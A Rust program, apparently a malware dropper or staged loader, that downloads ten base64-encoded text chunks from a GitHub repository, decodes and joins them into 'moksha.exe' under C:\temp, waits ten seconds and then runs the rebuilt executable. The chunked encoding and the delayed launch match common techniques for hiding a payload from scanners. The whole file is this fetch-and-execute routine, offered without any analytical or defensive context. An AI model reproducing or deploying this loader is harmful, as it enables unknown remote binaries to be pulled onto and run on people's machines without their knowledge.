use reqwest::blocking::get;
use std::fs::File;
use std::io::{self, Write};
use std::thread::sleep;
use std::time::Duration;
use std::process::Command;

fn main() -> io::Result<()> {
    let base_url = "https://raw.githubusercontent.com/climax0x/study_0x/main/part";
    let num_parts = 10; // total number of parts
    let temp_dir = "C:\\temp\\"; // Define the temporary directory path on Windows
    let mut executable_parts: Vec<Vec<u8>> = Vec::with_capacity(num_parts);

    // Ensure the temp directory exists
    std::fs::create_dir_all(temp_dir)?;

    // Download and decode parts
    for i in 1..=num_parts {
        let url = format!("{}{}.txt", base_url, i);
        println!("Downloading: {}", url);
        let response = get(&url).expect("Failed to download file");
        let content = response.text().expect("Failed to read response text");

        // Extract Base64 content
        let start = content.find('"').unwrap() + 1;
        let end = content.rfind('"').unwrap();
        let base64_data = &content[start..end];

        // Decode Base64 data
        let decoded_data = base64::decode(base64_data).expect("Failed to decode Base64");
        executable_parts.push(decoded_data);
    }

    // Combine all parts into one executable file in the temp directory
    let exe_path = format!("{}moksha.exe", temp_dir);
    let mut output_file = File::create(&exe_path)?;
    for part in executable_parts {
        output_file.write_all(&part)?;
    }

    // Wait for 10 seconds
    println!("Waiting for 10 seconds before executing the file...");
    sleep(Duration::from_secs(10));

    // Execute the file
    println!("Executing moksha.exe...");
    Command::new(&exe_path).spawn()?.wait()?;

    Ok(())
}
